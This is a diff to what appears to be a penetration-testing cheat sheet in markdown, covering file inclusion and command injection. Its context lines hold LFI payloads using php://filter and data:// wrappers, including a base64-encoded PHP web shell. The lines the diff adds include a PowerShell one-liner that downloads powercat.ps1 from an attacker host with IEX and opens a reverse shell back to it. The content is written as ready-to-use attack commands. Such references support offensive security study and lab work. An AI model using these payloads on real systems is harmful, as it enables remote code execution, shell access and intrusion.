@@ -36,6 +36,7 @@ curl http://site/index.php?page=php://filter/convert.base64-encode/resource=some
 curl http://site/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>
 echo -n '<?php echo system($_GET["cmd"]);?>' | base64
 curl http://site/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
+```
 
 ### Remote file inclusion
 
@@ -69,4 +70,10 @@ Overwrite ssh keys in `/home/someuser/.ssh/authorized_keys`
 
 ## Command injection
 
-
+Cmd or PowerShell: `(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell`
+Invoke-Expression, or IEX: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.3 \
+PowerCat: https://github.com/besimorhino/powercat/blob/master/powercat.ps1
+Url encoding: https://www.url-encode-decode.com/
+```
+IEX (New-Object System.Net.Webclient).DownloadString("http://$AttackerIp/powercat.ps1");powercat -c $AttackerIp -p $AttackerPort -e powershell
+```
